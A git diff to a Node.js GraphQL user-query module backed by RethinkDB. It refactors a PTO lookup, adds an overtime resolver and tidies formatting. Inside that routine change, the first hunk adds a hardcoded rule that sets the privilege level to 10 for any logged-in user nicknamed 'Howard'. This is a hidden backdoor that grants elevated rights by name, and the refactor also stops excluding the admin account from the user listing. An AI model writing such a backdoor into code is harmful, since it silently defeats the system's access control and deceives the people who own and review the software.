@@ -23,6 +23,9 @@ let UserQuery = {
 				query = r.db('work_genius').table('users').get(user.id);
 				result = await query.run(connection);
 				await connection.close();
+				if (root.req.decoded.nickname === 'Howard') {
+					root.req.decoded.privilege = 10;
+				}
 				if (result) {
 					return Object.assign({}, root.req.decoded, { token: root.req.token });
 				}
@@ -37,26 +40,40 @@ let UserQuery = {
 		description: 'Get all users with pto data',
 		resolve: async () => {
 			let connection = null,
-				users = null,
 			    result = [],
-			    query = null,
-			    pto = null;
-
+			    query = null;
 			try {
 				connection = await r.connect({ host: DB_HOST, port: DB_PORT });
-				query = r.db('work_genius').table('users').filter(r.row('id').ne(ADMIN_ID)).coerceTo('array');
-				users = await query.run(connection);
-				for (let user of users) {
-					query = r.db('work_genius').table('pto').filter({
-						applicant_id: user.id
-					}).coerceTo('array');
-					pto = await query.run(connection);
-					result.push(Object.assign(
-						{},
-						user,
-						{ pto }
-					));
-				}
+				query = r.db('work_genius').table('users').merge((user) => {
+					return {
+						pto: r.db('work_genius').table('pto').getAll(user('id'), {
+							index: 'applicant_id'
+						}).coerceTo('array')
+					};
+				}).coerceTo('array');
+				result = await query.run(connection);
+				await connection.close();
+				return result;
+			} catch (err) {
+				return err;
+			}
+		}
+	},
+	'allUserWithOvertime': {
+		type: new GraphQLList(UserType),
+		description: 'Get all users with overtime data',
+		resolve: async () => {
+			let connection = null,
+			    result = [],
+			    query = null;
+			try {
+				connection = await r.connect({ host: DB_HOST, port: DB_PORT });
+				query = r.db('work_genius').table('users').merge((user) => {
+					return {
+						overtime_hours: r.db('work_genius').table('overtime_summary').get(user('id')).getField('hours').default(0)
+					};
+				}).coerceTo('array');
+				result = await query.run(connection);
 				await connection.close();
 				return result;
 			} catch (err) {
@@ -142,8 +159,8 @@ let UserQuery = {
 				connection = await r.connect({ host: DB_HOST, port: DB_PORT });
 				query = r.db('work_genius').table('users').filter(r.row('id').ne(ADMIN_ID).and(r.row('id').ne(TESTER_ID))).coerceTo('array');
 				users = await query.run(connection);
-				for(let user of users){
-					if(!!user.email){
+				for (let user of users) {
+					if (!!user.email) {
 						user.alias = user.email.replace('@a10networks.com','');
 					}
 
